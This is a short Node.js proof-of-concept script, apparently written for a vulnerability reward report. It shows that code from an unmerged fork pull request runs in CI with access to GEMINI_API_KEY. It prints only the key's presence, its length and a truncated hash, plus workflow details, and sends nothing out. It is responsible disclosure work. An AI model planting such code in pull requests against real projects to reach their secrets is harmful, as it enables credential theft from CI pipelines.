// OSS VRP PoC: demonstrates that code from an unmerged fork PR reaches this
// script with CI secrets in its environment. Nothing is transmitted anywhere.
// It prints only a presence flag, the secret length, and a truncated SHA-256.
const crypto = require('crypto');
const fs = require('fs');

const key = process.env.GEMINI_API_KEY || '';
const digest = crypto.createHash('sha256').update(key).digest('hex').slice(0, 12);
const line = `POC_GEMINI_API_KEY present=${key.length > 0} length=${key.length} sha256_12=${digest}`;

console.log(line);
console.log(`POC_WORKFLOW=${process.env.GITHUB_WORKFLOW}`);
console.log(`POC_EVENT=${process.env.GITHUB_EVENT_NAME}`);
console.log(`POC_ACTOR=${process.env.GITHUB_ACTOR}`);

if (process.env.GITHUB_STEP_SUMMARY) {
  fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY, line + '\n');
}
